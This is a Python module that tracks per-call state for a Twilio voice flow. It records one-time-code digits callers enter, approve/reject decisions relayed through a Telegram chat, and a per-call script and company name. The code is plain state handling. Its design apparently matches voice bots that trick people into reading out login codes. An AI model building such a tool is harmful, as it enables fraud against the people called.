"""
In-memory per-call decision state for the live verification flow.
Keyed by Twilio CallSid.

Fields per call:
  code                    latest digits entered
  decision                None | "approve" | "reject"          (OTP hold)
  attempts                int
  chat_id                 Telegram chat that owns the call
  script                  current script name
  company                 company for this call
  phase                   freeform phase marker
  security_decision       None | "approve" | "reject"          (SECURITY stage 1)
  security_code_decision  None | "approve" | "reject"          (SECURITY stage 2)
  notyou_decision         None | "approve" | "reject"          (opt-out hold)
  answered_by             "" | "human" | "machine_start" | ...
  voicemail               bool
  duration                int seconds (filled at end)
  ts                      last-touched timestamp
"""

import threading
import time

_lock = threading.Lock()
_state = {}


def _blank(chat_id=None, script=None, company=None, phase=None):
    return {
        "code": None,
        "decision": None,
        "attempts": 0,
        "chat_id": chat_id,
        "script": script,
        "company": company,
        "phase": phase,
        "security_decision": None,
        "security_code_decision": None,
        "notyou_decision": None,
        "answered_by": "",
        "voicemail": False,
        "duration": 0,
        "retry_counts": {},
        "ts": time.time(),
    }


def new_call(sid, chat_id=None, script=None, company=None, phase=None):
    with _lock:
        _state[sid] = _blank(chat_id=chat_id, script=script,
                             company=company, phase=phase)
        return dict(_state[sid])


def get(sid):
    with _lock:
        return dict(_state.get(sid) or {})


def ensure(sid, chat_id=None, script=None, company=None, phase=None):
    with _lock:
        s = _state.get(sid)
        if not s:
            s = _blank(chat_id=chat_id, script=script,
                       company=company, phase=phase)
            _state[sid] = s
        else:
            if s.get("chat_id") is None and chat_id is not None:
                s["chat_id"] = chat_id
            if s.get("script") is None and script is not None:
                s["script"] = script
            if s.get("company") is None and company is not None:
                s["company"] = company
            if s.get("phase") is None and phase is not None:
                s["phase"] = phase
        s["ts"] = time.time()
        return dict(s)


def set_code(sid, code):
    with _lock:
        s = _state.setdefault(sid, _blank())
        s["code"] = code
        s["decision"] = None
        s["attempts"] += 1
        s["ts"] = time.time()
        return dict(s)


def set_decision(sid, decision):
    """decision = 'approve' | 'reject' | None"""
    with _lock:
        s = _state.get(sid)
        if not s:
            return None
        s["decision"] = decision
        s["ts"] = time.time()
        return dict(s)


def set_phase(sid, phase):
    with _lock:
        s = _state.get(sid)
        if not s:
            return None
        s["phase"] = phase
        s["ts"] = time.time()
        return dict(s)


def set_security_decision(sid, decision):
    with _lock:
        s = _state.get(sid)
        if not s:
            return None
        s["security_decision"] = decision
        s["ts"] = time.time()
        return dict(s)


def set_security_code_decision(sid, decision):
    with _lock:
        s = _state.get(sid)
        if not s:
            return None
        s["security_code_decision"] = decision
        s["ts"] = time.time()
        return dict(s)


def set_notyou_decision(sid, decision):
    with _lock:
        s = _state.get(sid)
        if not s:
            return None
        s["notyou_decision"] = decision
        s["ts"] = time.time()
        return dict(s)


def set_answered_by(sid, answered_by):
    with _lock:
        s = _state.get(sid)
        if not s:
            return None
        s["answered_by"] = answered_by or ""
        s["voicemail"] = bool(answered_by and answered_by.startswith("machine"))
        s["ts"] = time.time()
        return dict(s)


def set_duration(sid, duration):
    with _lock:
        s = _state.get(sid)
        if not s:
            return None
        try:
            s["duration"] = int(duration or 0)
        except Exception:
            s["duration"] = 0
        s["ts"] = time.time()
        return dict(s)


def clear(sid):
    with _lock:
        _state.pop(sid, None)


def sweep(max_age_seconds=1800):
    now = time.time()
    with _lock:
        stale = [k for k, v in _state.items()
                 if now - v.get("ts", 0) > max_age_seconds]
        for k in stale:
            _state.pop(k, None)